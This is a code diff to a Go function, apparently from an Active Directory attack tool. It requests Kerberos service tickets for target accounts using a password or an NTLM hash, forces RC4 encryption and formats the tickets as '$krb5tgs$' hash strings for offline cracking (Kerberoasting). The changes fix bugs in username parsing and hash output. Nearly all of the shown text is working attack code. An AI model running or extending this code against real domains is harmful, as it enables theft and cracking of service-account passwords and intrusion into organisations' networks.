@@ -13,6 +13,10 @@ import (
 )
 
 
+// dont really like this string for the config
+// would rather just create a new config and make changes via functions
+// would be easier to read
+// cant seem to figure out how to add a [realm] though
 const (
 libdefault = `[libdefaults]
 default_realm = %s
@@ -48,7 +52,7 @@ func RequestSPN(targetUser string, baseDN string, conn *ldap.Conn, username stri
     
     if password != ""{
         // If the password is provided we do not want the NETBIOS name
-        username = strings.Split(username, "\\"[1])
+        username = strings.Split(username, "\\")[1]
         cl = client.NewWithPassword(username, domain, password, c, client.DisablePAFXFAST(true), client.AssumePreAuthentication(false))
     }else if ntlm != ""{
         cl = client.NewWithHash(username, domain, ntlm, c, client.DisablePAFXFAST(true), client.AssumePreAuthentication(false))
@@ -71,7 +75,10 @@ func RequestSPN(targetUser string, baseDN string, conn *ldap.Conn, username stri
 
         cipherHex := make([]byte, hex.EncodedLen(len(tgt.EncPart.Cipher[16:])))
         hex.Encode(cipherHex, tgt.EncPart.Cipher[16:])
-        ticket = fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n\n", tgt.EncPart.EType, tgt.SName.NameString[0], tgt.Realm, tgt.SName.NameString[0], checksumHex, cipherHex)
+        ticket = fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s\n", tgt.EncPart.EType, tgt.SName.NameString[0], tgt.Realm, tgt.SName.NameString[0], checksumHex, cipherHex)
+    }else if tgt.EncPart.EType != etypeID.RC4_HMAC {
+        // Don't belive this would happen becuase we only offer rc4 encrpytion based on our config
+        l.Printf("Invalid encryption type")
     }
    return ticket
 }
